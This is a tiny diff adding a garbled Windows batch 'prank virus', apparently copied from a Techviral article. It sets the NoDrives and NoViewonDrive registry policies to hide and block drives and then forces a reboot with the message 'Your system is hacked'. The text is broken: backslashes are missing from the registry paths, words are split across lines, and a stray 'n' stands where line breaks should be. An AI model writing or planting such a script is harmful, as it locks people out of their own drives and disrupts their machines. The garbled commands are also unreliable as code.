@@ -1,0 +1,6 @@
+REG ADD HKEY_LOCAL_MACHINESOFTWAREMicrosoftWindowsCurrentVer sionpoliciesExplorer /v NoDrives /t REG_DWORD /d 12nREG ADD HKEY_LOCAL_MACHINESOFTWAREMicrosoftWindowsCurrentVer sionpoliciesExplorer /v NoViewonDrive /t RE
+
+G_DWORD /d 12nshutdown -r -c ”Lolllll! Your system is h
+acked by Techviral!” -f
+
+save as .bat
